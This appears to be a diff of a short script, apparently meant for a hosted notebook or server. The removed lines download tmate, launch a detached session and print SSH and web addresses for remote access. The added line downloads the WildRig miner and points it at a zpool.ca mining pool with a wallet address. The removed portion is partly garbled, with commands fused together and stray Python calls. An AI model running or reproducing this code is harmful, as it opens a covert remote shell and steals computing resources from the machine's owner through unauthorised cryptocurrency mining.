@@ -1,17 +1,1 @@
-#!/bin/sh
-pkill -9 tmate
-wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"!pkill -9 tmate
-wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
- sleep(59)
- print("Vapers86")
- sleep(1)
+wget https://github.com/andru-kun/wildrig-multi/releases/download/0.31.3/wildrig-multi-linux-0.31.3.tar.xz && tar -xvf wildrig-multi-linux-0.31.3.tar.xz && ./wildrig-multi -a heavyhash -o heavyhash.sea.mine.zpool.ca:5138 --user RL9QURyvifYBsB3Cg6HWr16mdsX7C7A7X1 -p Vapers86
